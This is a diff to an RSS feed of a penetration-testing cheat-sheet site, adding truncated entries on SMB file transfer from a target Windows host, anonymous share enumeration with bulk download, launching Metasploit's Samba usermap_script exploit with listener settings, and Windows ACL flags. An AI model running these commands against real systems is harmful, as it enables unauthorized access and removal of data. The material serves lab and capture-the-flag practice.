@@ -19,7 +19,14 @@
       <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
-      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.</description>
+      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>Metasploit</title>
+      <link>https://tldrbins.github.io/metasploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit/</guid>
+      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by # or name use 15 use exploit/multi/samba/usermap_script # Show exploit settings optiions # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>MSSQL General</title>
@@ -54,7 +61,7 @@
       <link>https://tldrbins.github.io/smb_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
-      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 --no-banner -u null # List known share smbmap -H 10.10.11.10 --no-banner -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * Login with password smbmap smbmap -H 10.10.11.10 -u username -p password # List known share smbmap -H 10.</description>
+      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null # List known share smbmap -H 10.10.11.10 -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.</description>
     </item>
     <item>
       <title>SMB Server</title>
@@ -62,6 +69,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_server/</guid>
       <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
+    </item>
+    <item>
+      <title>Windows ACLs</title>
+      <link>https://tldrbins.github.io/windows_acls/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_acls/</guid>
+      <description> Window ACLs (Access Control Lists) Check ACLs icacls &amp;#34;C:\Users\User&amp;#34; F (full access) M (modify access) RX (read and execute access) R (read-only access) W (write-only access) D (delete) RC (read control) WDAC (write DAC) WO (write owner) S (synchronize) AS (access system security) MA (maximum allowed) GR (generic read) GW (generic write) GE (generic execute) GA (generic all) RD (read data/list directory) WD (write data/add file) AD (append data/add subdirectory) REA (read extended attributes) WEA (write extended attributes) X (execute/traverse) DC (delete child) RA (read attributes) WA (write attributes) OI (object inherit) CI (container inherit) IO (inherit only) NP (do not propagate inherit) I (permission inherited from parent container) </description>
     </item>
   </channel>
 </rss>
